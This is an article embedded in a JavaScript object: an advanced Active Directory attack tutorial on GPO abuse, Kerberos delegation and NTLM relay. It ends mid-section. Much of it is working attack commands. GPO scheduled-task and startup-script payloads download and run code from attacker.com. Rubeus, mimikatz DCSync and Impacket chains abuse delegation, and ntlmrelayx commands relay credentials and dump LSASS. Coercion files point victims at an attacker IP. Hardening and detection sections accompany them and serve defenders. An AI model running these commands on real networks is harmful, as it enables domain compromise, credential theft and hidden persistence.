// Active Directory Advanced Attacks: GPO, Delegation, and Persistence
const adAdvancedAttacksArticle = {
    title: 'Active Directory Advanced Attacks: GPO, Delegation, and Persistence',
    date: 'February 15, 2025',
    readTime: '70 min read',
    tag: 'Active Directory',
    difficulty: 'Advanced',
    content: `
        <div class="article-header">
            <h1>Active Directory Advanced Attacks: GPO, Delegation, and Persistence</h1>
            <p class="article-meta">Master advanced AD exploitation techniques and defense strategies</p>
        </div>

        <h3>What You'll Master</h3>
        <ul>
            <li>Group Policy Objects (GPO): Architecture, enumeration, and exploitation</li>
            <li>Kerberos delegation attacks: Unconstrained, constrained, and resource-based constrained delegation</li>
            <li>NTLM relay attacks: SMB, HTTP, and LDAP relay techniques</li>
            <li>Advanced ticket attacks: Golden, Silver, Diamond, and Sapphire tickets</li>
            <li>Roasting attacks: AS-REP Roasting and Kerberoasting in depth</li>
            <li>DCSync and DCShadow: Replication-based attacks</li>
            <li>Comprehensive defense strategies and detection mechanisms</li>
            <li>Real-world attack chains and persistence techniques</li>
        </ul>

        <h2>Introduction: Beyond the Basics</h2>
        
        <p>While understanding Active Directory fundamentals is crucial, mastering advanced attack techniques separates competent penetration testers from exceptional ones. This article builds upon AD basics to explore sophisticated exploitation methods that leverage the complex trust relationships, delegation mechanisms, and authentication protocols inherent in Active Directory environments.</p>

        <p>These advanced techniques are regularly used in real-world penetration tests and red team operations. Understanding them deeply—both from an offensive and defensive perspective—is essential for anyone serious about Active Directory security.</p>

        <h2>Group Policy Objects (GPO) Deep Dive</h2>

        <h3>GPO Architecture and Storage</h3>

        <p>Group Policy Objects are one of the most powerful administrative tools in Active Directory, but they're also a prime target for attackers. Understanding GPO architecture is crucial for both exploitation and defense.</p>

        <p><strong>GPO Components:</strong></p>
        <ul>
            <li><strong>Group Policy Container (GPC):</strong> Stored in Active Directory (LDAP), contains GPO properties, version information, and status</li>
            <li><strong>Group Policy Template (GPT):</strong> Stored in SYSVOL (\\\\domain\\SYSVOL\\domain\\Policies\\{GUID}), contains actual policy settings, scripts, and files</li>
        </ul>

        <p><strong>SYSVOL Structure:</strong></p>
        <pre><code>\\\\DOMAIN.COM\\SYSVOL\\DOMAIN.COM\\
├── Policies\\
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}  # Default Domain Policy
│   ├── {6AC1786C-016F-11D2-945F-00C04fB984F9}  # Default Domain Controllers Policy
│   └── {Custom-GUID}                            # Custom GPOs
│       ├── Machine\\                            # Computer settings
│       │   ├── Registry.pol
│       │   ├── Scripts\\
│       │   └── Preferences\\
│       └── User\\                               # User settings
│           ├── Registry.pol
│           └── Scripts\\
└── scripts\\                                    # Legacy logon scripts</code></pre>

        <h3>GPO Processing Order (LSDOU)</h3>

        <p>GPOs are applied in a specific order, with later policies overwriting earlier ones (unless "Enforced" is set):</p>

        <ol>
            <li><strong>Local:</strong> Local computer policy</li>
            <li><strong>Site:</strong> Policies linked to the Active Directory site</li>
            <li><strong>Domain:</strong> Policies linked to the domain</li>
            <li><strong>Organizational Unit:</strong> Policies linked to OUs (parent OU first, then child OUs)</li>
        </ol>

        <p><strong>Key GPO Attributes:</strong></p>
        <ul>
            <li><strong>Enforced:</strong> GPO cannot be overridden by lower-level policies</li>
            <li><strong>Block Inheritance:</strong> Prevents GPOs from parent containers from applying</li>
            <li><strong>Link Enabled:</strong> Determines if the GPO link is active</li>
            <li><strong>GPO Enabled:</strong> Determines if the GPO itself is active</li>
        </ul>

        <h3>GPO Enumeration</h3>

        <p><strong>PowerView GPO Enumeration:</strong></p>
        <pre><code># Get all GPOs in the domain
Get-DomainGPO

# Get GPOs applied to a specific computer
Get-DomainGPO -ComputerIdentity "WORKSTATION01"

# Find GPOs that modify local group membership
Get-DomainGPOLocalGroup

# Get GPOs that set restricted groups
Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName, GroupMembers

# Find GPOs with specific settings
Get-DomainGPO | Where-Object { $_.DisplayName -like "*admin*" }

# Get GPO permissions
Get-DomainObjectAcl -Identity "CN={GPO-GUID},CN=Policies,CN=System,DC=domain,DC=com" -ResolveGUIDs

# Find users who can modify GPOs
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=domain,DC=com" -ResolveGUIDs | 
    Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" }</code></pre>

        <p><strong>Native Windows GPO Enumeration:</strong></p>
        <pre><code># Get applied GPOs for current computer
gpresult /R
gpresult /H report.html

# Get detailed GPO information
Get-GPO -All
Get-GPO -Name "Default Domain Policy"

# Get GPO report
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path report.html

# Get GPO links
Get-GPInheritance -Target "OU=Workstations,DC=domain,DC=com"

# Check GPO permissions
Get-GPPermission -Name "Default Domain Policy" -All</code></pre>

        <p><strong>BloodHound GPO Queries:</strong></p>
        <pre><code># Find users who can modify GPOs
MATCH (u:User)-[r:GenericWrite|WriteProperty|WriteDacl|WriteOwner]->(g:GPO) RETURN u,r,g

# Find computers affected by a specific GPO
MATCH (g:GPO)-[r:GpLink]->(c:Computer) WHERE g.name = "VULNERABLE GPO" RETURN g,r,c

# Find GPOs that can be modified by non-admin users
MATCH (u:User)-[r:GenericWrite|WriteProperty]->(g:GPO) 
WHERE NOT u.name CONTAINS "ADMIN" 
RETURN u.name, g.name

# Find path from owned user to GPO modification
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:GPO)) RETURN p</code></pre>

        <h3>GPO Abuse Techniques</h3>

        <h4>Immediate Scheduled Tasks</h4>

        <p>One of the most powerful GPO abuse techniques is creating immediate scheduled tasks that execute with SYSTEM privileges.</p>

        <p><strong>Manual GPO Modification:</strong></p>
        <pre><code># 1. Identify writable GPO
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | 
    Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl" }

# 2. Create malicious scheduled task XML
# Save as ScheduledTasks.xml in GPO's Machine\\Preferences\\ScheduledTasks\\
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"&gt;
    &lt;ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" 
                     name="Backdoor" 
                     image="0" 
                     changed="2025-02-15 12:00:00" 
                     uid="{12345678-1234-1234-1234-123456789012}"&gt;
        &lt;Properties action="C" 
                   name="Backdoor" 
                   runAs="NT AUTHORITY\\System" 
                   logonType="S4U"&gt;
            &lt;Task version="1.3"&gt;
                &lt;Exec&gt;
                    &lt;Command&gt;powershell.exe&lt;/Command&gt;
                    &lt;Arguments&gt;-NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"&lt;/Arguments&gt;
                &lt;/Exec&gt;
            &lt;/Task&gt;
        &lt;/Properties&gt;
    &lt;/ImmediateTaskV2&gt;
&lt;/ScheduledTasks&gt;

# 3. Upload to SYSVOL
copy ScheduledTasks.xml "\\\\domain.com\\SYSVOL\\domain.com\\Policies\\{GPO-GUID}\\Machine\\Preferences\\ScheduledTasks\\"

# 4. Force GPO update on target
Invoke-GPUpdate -Computer "TARGET-PC" -Force</code></pre>

        <p><strong>Using SharpGPOAbuse:</strong></p>
        <pre><code># Add local admin via GPO
.\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount "attacker" --GPOName "Vulnerable GPO"

# Add immediate scheduled task
.\\SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author "NT AUTHORITY\\SYSTEM" 
    --Command "cmd.exe" --Arguments "/c powershell -enc [base64_payload]" --GPOName "Vulnerable GPO"

# Modify user rights assignment
.\\SharpGPOAbuse.exe --AddUserRights --UserRights "SeDebugPrivilege" --UserAccount "attacker" --GPOName "Vulnerable GPO"</code></pre>

        <h4>Startup/Shutdown Scripts</h4>

        <pre><code># Add startup script to GPO
# 1. Create malicious script
echo 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/payload.ps1\")"' > startup.bat

# 2. Copy to GPO scripts folder
copy startup.bat "\\\\domain.com\\SYSVOL\\domain.com\\Policies\\{GPO-GUID}\\Machine\\Scripts\\Startup\\"

# 3. Modify scripts.ini
echo "[Startup]" > scripts.ini
echo "0CmdLine=startup.bat" >> scripts.ini
echo "0Parameters=" >> scripts.ini
copy scripts.ini "\\\\domain.com\\SYSVOL\\domain.com\\Policies\\{GPO-GUID}\\Machine\\Scripts\\scripts.ini"</code></pre>

        <h4>Registry Modifications</h4>

        <pre><code># Modify registry via GPO to add persistence
# Create Registry.pol file with desired registry changes

# Example: Add run key for persistence
# This requires creating a properly formatted Registry.pol file
# Tools like LGPO.exe or PowerShell can help create these files

# Using PowerShell to create registry preference
$RegPath = "\\\\domain.com\\SYSVOL\\domain.com\\Policies\\{GPO-GUID}\\Machine\\Preferences\\Registry\\"
# Create Registry.xml with malicious registry keys</code></pre>

        <h3>GPO-Based Persistence</h3>

        <p>GPOs provide excellent persistence because they:</p>
        <ul>
            <li>Execute with SYSTEM privileges</li>
            <li>Apply automatically during computer startup or user logon</li>
            <li>Are difficult to detect without proper monitoring</li>
            <li>Can affect multiple computers simultaneously</li>
        </ul>

        <p><strong>Persistence Techniques:</strong></p>
        <ol>
            <li><strong>Immediate Scheduled Tasks:</strong> Execute immediately and repeatedly</li>
            <li><strong>Startup Scripts:</strong> Execute during computer startup</li>
            <li><strong>Logon Scripts:</strong> Execute during user logon</li>
            <li><strong>Registry Run Keys:</strong> Add persistence via registry modifications</li>
            <li><strong>Software Installation:</strong> Deploy malicious MSI packages</li>
        </ol>

        <h3>GPO Defense and Monitoring</h3>

        <p><strong>Hardening Recommendations:</strong></p>
        <ul>
            <li><strong>Restrict GPO Modification:</strong> Only Domain Admins should be able to modify GPOs</li>
            <li><strong>Audit GPO Changes:</strong> Enable auditing on GPO objects and SYSVOL</li>
            <li><strong>Monitor SYSVOL:</strong> Implement file integrity monitoring on SYSVOL</li>
            <li><strong>Review GPO Permissions:</strong> Regularly audit who can modify GPOs</li>
            <li><strong>Use GPO Versioning:</strong> Track GPO version numbers for unauthorized changes</li>
        </ul>

        <p><strong>Detection Strategies:</strong></p>
        <pre><code># Monitor Event IDs for GPO changes
# Event ID 5136: Directory Service object modified
# Event ID 5137: Directory Service object created
# Event ID 5141: Directory Service object deleted

# PowerShell monitoring script
$Events = Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 5136, 5137, 5141
} | Where-Object { $_.Message -like "*CN=Policies*" }

# Check GPO version numbers for unexpected changes
Get-GPO -All | Select-Object DisplayName, 
    @{Name="ComputerVersion";Expression={$_.Computer.DSVersion}},
    @{Name="UserVersion";Expression={$_.User.DSVersion}},
    ModificationTime

# Audit SYSVOL file changes
# Use Windows File Auditing or third-party tools to monitor SYSVOL</code></pre>

        <p><strong>Incident Response:</strong></p>
        <pre><code># If GPO compromise is suspected:

# 1. Identify modified GPOs
Get-GPO -All | Where-Object { $_.ModificationTime -gt (Get-Date).AddDays(-7) }

# 2. Review GPO settings
Get-GPOReport -Name "Suspicious GPO" -ReportType HTML -Path report.html

# 3. Check SYSVOL for malicious files
Get-ChildItem "\\\\domain.com\\SYSVOL\\domain.com\\Policies\\" -Recurse | 
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) }

# 4. Review GPO permissions
Get-GPPermission -Name "Suspicious GPO" -All

# 5. Restore from backup if necessary
Restore-GPO -Name "Compromised GPO" -Path "C:\\GPOBackups\\"

# 6. Force GPO update to remove malicious settings
Invoke-GPUpdate -Force -Target "Computer"</code></pre>

        <h2>Kerberos Delegation Attacks</h2>

        <h3>Understanding Kerberos Delegation</h3>

        <p>Kerberos delegation allows a service to impersonate a user to access resources on that user's behalf. While this is a legitimate feature designed for multi-tier applications, it's also a powerful attack vector when misconfigured.</p>

        <p><strong>Delegation Scenario Example:</strong></p>
        <p>A web server needs to access a database on behalf of an authenticated user. Instead of the user directly authenticating to the database, the web server impersonates the user using delegation.</p>

        <h3>Unconstrained Delegation</h3>

        <p>Unconstrained delegation is the most dangerous form of delegation. When a user authenticates to a service with unconstrained delegation enabled, the user's TGT is sent to the service and stored in memory. The service can then use this TGT to impersonate the user to ANY service in the domain.</p>

        <p><strong>How Unconstrained Delegation Works:</strong></p>
        <ol>
            <li>User authenticates to service with unconstrained delegation</li>
            <li>User's TGT is included in the service ticket</li>
            <li>Service extracts and stores the TGT in LSASS memory</li>
            <li>Service can now impersonate the user to any service</li>
        </ol>

        <p><strong>Unconstrained Delegation Enumeration:</strong></p>
        <pre><code># PowerView - Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained

# PowerView - Exclude domain controllers
Get-DomainComputer -Unconstrained | Where-Object { $_.Name -notlike "*DC*" }

# LDAP query for unconstrained delegation
# userAccountControl flag: TRUSTED_FOR_DELEGATION (524288)
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# BloodHound query
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

# Check specific computer
Get-DomainComputer -Identity "WEBSERVER01" | Select-Object name, useraccountcontrol</code></pre>

        <p><strong>Printer Bug Attack (Forced Authentication):</strong></p>
        <p>The printer bug (MS-RPRN) can force a domain controller to authenticate to a computer with unconstrained delegation, allowing you to capture the DC's TGT.</p>

        <pre><code># 1. Start monitoring for new TGTs on compromised server with unconstrained delegation
# On WEBSERVER01 (has unconstrained delegation)
.\\Rubeus.exe monitor /interval:5 /filteruser:DC01$

# 2. From attacker machine, trigger printer bug to force DC authentication
.\\SpoolSample.exe DC01.domain.com WEBSERVER01.domain.com

# 3. Rubeus will capture the DC's TGT
# Output will show base64-encoded TGT

# 4. Inject the captured TGT
.\\Rubeus.exe ptt /ticket:[base64_ticket]

# 5. Perform DCSync
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt</code></pre>

        <p><strong>Alternative: Using Impacket:</strong></p>
        <pre><code># Monitor for incoming tickets
python krbrelayx.py -t ldap://DC01.domain.com

# Trigger authentication
python printerbug.py domain.com/user:password@DC01.domain.com WEBSERVER01.domain.com

# Use captured ticket
export KRB5CCNAME=ticket.ccache
python secretsdump.py -k -no-pass DC01.domain.com</code></pre>

        <h3>Constrained Delegation</h3>

        <p>Constrained delegation restricts which services a computer or user can impersonate users to. This is configured via the <code>msDS-AllowedToDelegateTo</code> attribute.</p>

        <p><strong>Constrained Delegation Types:</strong></p>
        <ul>
            <li><strong>Kerberos Only:</strong> Requires the user to authenticate via Kerberos</li>
            <li><strong>Protocol Transition:</strong> Allows the service to obtain a service ticket on behalf of a user without the user authenticating via Kerberos (uses S4U2Self)</li>
        </ul>

        <p><strong>S4U Extensions:</strong></p>
        <ul>
            <li><strong>S4U2Self (Service for User to Self):</strong> Allows a service to obtain a service ticket to itself on behalf of any user</li>
            <li><strong>S4U2Proxy (Service for User to Proxy):</strong> Allows a service to obtain a service ticket to another service on behalf of a user</li>
        </ul>

        <p><strong>Constrained Delegation Enumeration:</strong></p>
        <pre><code># PowerView - Find computers with constrained delegation
Get-DomainComputer -TrustedToAuth

# Find users with constrained delegation
Get-DomainUser -TrustedToAuth

# Get delegation targets
Get-DomainComputer -Identity "WEBSERVER01" | Select-Object name, msds-allowedtodelegateto

# LDAP query
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo

# Check for protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION)
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true}</code></pre>

        <p><strong>Constrained Delegation Exploitation:</strong></p>
        <pre><code># Scenario: WEBSERVER01 has constrained delegation to CIFS/FILESERVER01

# 1. Obtain TGT for WEBSERVER01 (requires computer account hash or access)
.\\Rubeus.exe asktgt /user:WEBSERVER01$ /rc4:[NTLM_HASH] /domain:domain.com

# 2. Perform S4U2Self to get forwardable ticket for any user
.\\Rubeus.exe s4u /ticket:[base64_TGT] /impersonateuser:Administrator /msdsspn:cifs/FILESERVER01 /ptt

# Alternative: Combined approach
.\\Rubeus.exe s4u /user:WEBSERVER01$ /rc4:[NTLM_HASH] /impersonateuser:Administrator 
    /msdsspn:cifs/FILESERVER01 /ptt

# 3. Access the target service
dir \\\\FILESERVER01\\C$</code></pre>

        <p><strong>Alternate Service Name Abuse:</strong></p>
        <p>Kerberos doesn't validate the service class in the SPN, only the hostname. This means if you have delegation to <code>CIFS/FILESERVER01</code>, you can request tickets for ANY service on FILESERVER01.</p>

        <pre><code># Delegated to CIFS/FILESERVER01, but request HTTP ticket
.\\Rubeus.exe s4u /user:WEBSERVER01$ /rc4:[NTLM_HASH] /impersonateuser:Administrator 
    /msdsspn:cifs/FILESERVER01 /altservice:http /ptt

# Now you can access HTTP services
# Or request LDAP for DCSync if target is a DC
.\\Rubeus.exe s4u /user:WEBSERVER01$ /rc4:[NTLM_HASH] /impersonateuser:Administrator 
    /msdsspn:cifs/DC01 /altservice:ldap /ptt

# Perform DCSync
mimikatz # lsadump::dcsync /domain:domain.com /user:Administrator</code></pre>

        <p><strong>Using Impacket:</strong></p>
        <pre><code># Get service ticket via S4U
python getST.py -spn cifs/FILESERVER01 -impersonate Administrator domain.com/WEBSERVER01$

# Use alternate service
python getST.py -spn cifs/DC01 -impersonate Administrator -altservice ldap domain.com/WEBSERVER01$

# Use the ticket
export KRB5CCNAME=Administrator.ccache
python secretsdump.py -k -no-pass DC01.domain.com</code></pre>

        <h3>Resource-Based Constrained Delegation (RBCD)</h3>

        <p>RBCD is a newer form of delegation introduced in Windows Server 2012. Unlike traditional constrained delegation where the delegating account specifies which services it can delegate to, RBCD allows the target resource to specify which accounts can delegate to it.</p>

        <p><strong>Key Differences:</strong></p>
        <ul>
            <li>Configured on the target resource, not the delegating account</li>
            <li>Uses <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute</li>
            <li>Does not require Domain Admin privileges to configure (only WriteProperty on the target)</li>
            <li>Can be abused if you can write to a computer's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute</li>
        </ul>

        <p><strong>RBCD Attack Prerequisites:</strong></p>
        <ol>
            <li>WriteProperty permission on target computer's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></li>
            <li>Ability to create a computer account OR control an existing computer account</li>
        </ol>

        <p><strong>RBCD Enumeration:</strong></p>
        <pre><code># Find computers with RBCD configured
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | 
    Where-Object { $_.ObjectAceType -eq "msDS-AllowedToActOnBehalfOfOtherIdentity" }

# Check specific computer
Get-ADComputer -Identity "FILESERVER01" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# Find computers you can modify
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | 
    Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll" -and 
                   $_.SecurityIdentifier -match $CurrentUserSID }</code></pre>

        <p><strong>RBCD Exploitation:</strong></p>
        <pre><code># Step 1: Create a new computer account (if you have the privilege)
# By default, domain users can add up to 10 computer accounts (ms-DS-MachineAccountQuota)

# Using PowerMad
Import-Module .\\Powermad.ps1
New-MachineAccount -MachineAccount "FAKE01" -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Step 2: Configure RBCD on target computer
# Set FAKE01 to be allowed to delegate to TARGET01

# Using PowerView
$ComputerSid = Get-DomainComputer -Identity "FAKE01" | Select-Object -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer -Identity "TARGET01" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Using ActiveDirectory module
$ComputerSid = Get-ADComputer -Identity "FAKE01" | Select-Object -ExpandProperty SID
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-ADComputer -Identity "TARGET01" -PrincipalsAllowedToDelegateToAccount "FAKE01$"

# Step 3: Perform S4U attack
.\\Rubeus.exe s4u /user:FAKE01$ /rc4:[NTLM_HASH_OF_FAKE01] /impersonateuser:Administrator 
    /msdsspn:cifs/TARGET01 /ptt

# Step 4: Access the target
dir \\\\TARGET01\\C$

# Step 5: Cleanup (remove RBCD configuration)
Set-ADComputer -Identity "TARGET01" -PrincipalsAllowedToDelegateToAccount $null</code></pre>

        <p><strong>Using Impacket for RBCD:</strong></p>
        <pre><code># Add computer account
python addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Password123!' domain.com/user:password

# Configure RBCD
python rbcd.py -delegate-from 'FAKE01$' -delegate-to 'TARGET01$' -action write domain.com/user:password

# Get service ticket
python getST.py -spn cifs/TARGET01 -impersonate Administrator domain.com/FAKE01$:'Password123!'

# Use ticket
export KRB5CCNAME=Administrator.ccache
python smbexec.py -k -no-pass TARGET01.domain.com</code></pre>

        <h3>Delegation Defense Strategies</h3>

        <p><strong>Hardening Recommendations:</strong></p>
        <ul>
            <li><strong>Avoid Unconstrained Delegation:</strong> Never use unconstrained delegation except on domain controllers</li>
            <li><strong>Use RBCD Instead:</strong> Prefer RBCD over traditional constrained delegation</li>
            <li><strong>Protect Sensitive Accounts:</strong> Mark sensitive accounts as "Account is sensitive and cannot be delegated"</li>
            <li><strong>Limit Computer Account Creation:</strong> Set ms-DS-MachineAccountQuota to 0</li>
            <li><strong>Monitor Delegation Changes:</strong> Alert on modifications to delegation attributes</li>
            <li><strong>Use Protected Users Group:</strong> Members cannot be delegated</li>
        </ul>

        <p><strong>Detection Strategies:</strong></p>
        <pre><code># Monitor for new computer accounts
Get-ADComputer -Filter {Created -gt $Yesterday} | Select-Object Name, Created, Creator

# Monitor delegation attribute changes
# Event ID 5136 - Directory Service object modified
# Look for changes to:
# - userAccountControl (unconstrained delegation)
# - msDS-AllowedToDelegateTo (constrained delegation)
# - msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)

# Check for suspicious delegation configurations
Get-ADComputer -Filter {TrustedForDelegation -eq $true} | 
    Where-Object { $_.Name -notlike "*DC*" }

# Audit ms-DS-MachineAccountQuota
Get-ADDomain | Select-Object -ExpandProperty ms-DS-MachineAccountQuota

# Find accounts that can create computer objects
Get-ADObject -SearchBase "CN=Computers,DC=domain,DC=com" -SearchScope Base -Properties nTSecurityDescriptor | 
    Select-Object -ExpandProperty nTSecurityDescriptor | 
    Select-Object -ExpandProperty Access | 
    Where-Object { $_.ActiveDirectoryRights -match "CreateChild" }</code></pre>

        <p><strong>Protected Users Group:</strong></p>
        <pre><code># Add sensitive accounts to Protected Users group
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator", "Domain Admins"

# Note: Protected Users group restrictions:
# - Cannot use NTLM authentication
# - Cannot use DES or RC4 in Kerberos pre-authentication
# - Cannot be delegated
# - TGT lifetime limited to 4 hours
# - Requires Windows Server 2012 R2 or later domain functional level</code></pre>

        <h2>NTLM Relay Attacks</h2>

        <h3>NTLM Relay Fundamentals</h3>

        <p>NTLM relay attacks exploit the challenge-response nature of NTLM authentication. Instead of cracking captured NTLM hashes, an attacker relays the authentication to another service, effectively impersonating the victim.</p>

        <p><strong>NTLM Authentication Flow (Simplified):</strong></p>
        <ol>
            <li><strong>Client → Server:</strong> Client requests access</li>
            <li><strong>Server → Client:</strong> Server sends challenge</li>
            <li><strong>Client → Server:</strong> Client sends response (encrypted challenge with password hash)</li>
            <li><strong>Server:</strong> Validates response</li>
        </ol>

        <p><strong>NTLM Relay Attack Flow:</strong></p>
        <ol>
            <li><strong>Victim → Attacker:</strong> Victim authenticates to attacker-controlled service</li>
            <li><strong>Attacker → Target:</strong> Attacker forwards authentication to target service</li>
            <li><strong>Target → Attacker:</strong> Target sends challenge</li>
            <li><strong>Attacker → Victim:</strong> Attacker forwards challenge to victim</li>
            <li><strong>Victim → Attacker:</strong> Victim sends response</li>
            <li><strong>Attacker → Target:</strong> Attacker forwards response to target</li>
            <li><strong>Target:</strong> Validates response and grants access to attacker</li>
        </ol>

        <p><strong>Key Limitations:</strong></p>
        <ul>
            <li>Cannot relay to the same machine (MIC - Message Integrity Check prevents this)</li>
            <li>SMB signing prevents relay to SMB</li>
            <li>LDAP signing and channel binding prevent relay to LDAP/LDAPS</li>
            <li>EPA (Extended Protection for Authentication) prevents relay to HTTP</li>
        </ul>

        <h3>SMB Relay Attacks</h3>

        <p>SMB relay is one of the most common and effective relay attacks. It allows an attacker to relay NTLM authentication to SMB services on other machines.</p>

        <p><strong>Prerequisites:</strong></p>
        <ul>
            <li>SMB signing must be disabled or not required on target</li>
            <li>Relayed user must have admin privileges on target</li>
            <li>Cannot relay back to the same machine</li>
        </ul>

        <p><strong>Identify Targets Without SMB Signing:</strong></p>
        <pre><code># Using CrackMapExec
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# Using Nmap
nmap --script smb-security-mode,smb2-security-mode -p445 192.168.1.0/24

# Using RunFinger (Impacket)
python RunFinger.py -i 192.168.1.0/24

# Manual check with PowerShell
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableSecuritySignature</code></pre>

        <p><strong>Basic SMB Relay Attack:</strong></p>
        <pre><code># 1. Start ntlmrelayx targeting specific hosts
python ntlmrelayx.py -tf targets.txt -smb2support

# 2. Trigger authentication (using Responder, mitm6, or other methods)
# When a victim authenticates, ntlmrelayx will relay to targets

# 3. ntlmrelayx will automatically:
# - Dump SAM database
# - Enumerate shares
# - Execute commands (if specified)</code></pre>

        <p><strong>SMB Relay with Command Execution:</strong></p>
        <pre><code># Execute specific command
python ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Execute PowerShell payload
python ntlmrelayx.py -tf targets.txt -smb2support 
    -c "powershell -enc [base64_payload]"

# Dump LSASS
python ntlmrelayx.py -tf targets.txt -smb2support 
    -c "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump [lsass_pid] C:\\temp\\lsass.dmp full"</code></pre>

        <p><strong>SMB Relay with SOCKS Proxy:</strong></p>
        <pre><code># Start ntlmrelayx with SOCKS proxy
python ntlmrelayx.py -tf targets.txt -smb2support -socks

# When authentication is relayed, a SOCKS connection is established
# Use proxychains to interact with the target

# Edit /etc/proxychains.conf
socks4 127.0.0.1 1080

# Use SOCKS connection
proxychains smbclient.py DOMAIN/USER@TARGET
proxychains secretsdump.py DOMAIN/USER@TARGET
proxychains wmiexec.py DOMAIN/USER@TARGET</code></pre>

        <h3>HTTP to SMB/LDAP Relay</h3>

        <p>HTTP services often don't implement proper protections against NTLM relay, making them excellent sources for capturing authentication.</p>

        <p><strong>Using Responder + ntlmrelayx:</strong></p>
        <pre><code># 1. Configure Responder to not respond to SMB/HTTP (we want to relay, not capture)
# Edit /etc/responder/Responder.conf
SMB = Off
HTTP = Off

# 2. Start Responder
python Responder.py -I eth0 -v

# 3. Start ntlmrelayx
python ntlmrelayx.py -tf targets.txt -smb2support

# 4. Trigger authentication via various methods:
# - LLMNR/NBT-NS poisoning (Responder handles this)
# - Malicious file shares with UNC paths
# - Phishing emails with UNC paths
# - IPv6 DNS takeover (mitm6)</code></pre>

        <p><strong>Forced Authentication Techniques:</strong></p>
        <pre><code># 1. UNC Path in Office Documents
# Create .docx with image pointing to \\\\attacker-ip\\share\\image.png

# 2. Windows Shortcuts (.lnk files)
# Create shortcut with icon pointing to \\\\attacker-ip\\share\\icon.ico

# 3. SCF Files (Shell Command Files)
# Place in SMB share, triggers authentication when folder is viewed
[Shell]
Command=2
IconFile=\\\\attacker-ip\\share\\icon.ico
[Taskbar]
Command=ToggleDesktop

# 4. URL Files
[InternetShortcut]
URL=file://attacker-ip/share/

# 5. Printer Bug (MS-RPRN)
python printerbug.py domain.com/user:password@target attacker-ip

# 6. PetitPotam
python PetitPotam.py attacker-ip target-ip

# 7. DFSCoerce
python dfscoerce.py -u user -p password attacker-ip target-ip</code></pre>

        <h3>LDAP Relay Attacks</h3>

        <p>LDAP relay is particularly powerful because it can be used to modify Active Directory objects, including creating computer accounts and configuring RBCD.</p>

        <p><strong>LDAP Relay to Create Computer Account:</strong></p>
        <pre><code># Relay to LDAP and create computer account
python ntlmrelayx.py -t ldap://DC01.domain.com --add-computer

# When authentication is relayed, a new computer account is created
# Output will show: Created computer account: DESKTOP-XXXXX$ with password: XXXXXXXX</code></pre>

        <p><strong>LDAP Relay for RBCD Attack:</strong></p>
        <pre><code># 1. Relay to LDAP and configure RBCD
python ntlmrelayx.py -t ldap://DC01.domain.com --delegate-access

# This will:
# - Create a new computer account
# - Configure RBCD on the victim machine to allow the new computer to delegate

# 2. Use the created computer account for S4U attack
python getST.py -spn cifs/VICTIM-PC -impersonate Administrator 
    domain.com/DESKTOP-XXXXX$:'PASSWORD'

# 3. Use the ticket
export KRB5CCNAME=Administrator.ccache
python smbexec.py -k -no-pass VICTIM-PC.domain.com</code></pre>

        <p><strong>LDAP Relay to Modify ACLs:</strong></p>
        <pre><code># Relay to LDAP and grant DCSync rights
python ntlmrelayx.py -t ldap://DC01.domain.com --escalate-user lowpriv-user

# This grants the specified user DCSync rights (DS-Replication-Get-Changes)
# Then perform DCSync
python secretsdump.py domain.com/lowpriv-user:password@DC01.domain.com</code></pre>

        <h3>LDAPS Relay and Channel Binding</h3>

        <p>LDAPS (LDAP over SSL/TLS) with channel binding is designed to prevent relay attacks. However, misconfigurations can still allow relay.</p>

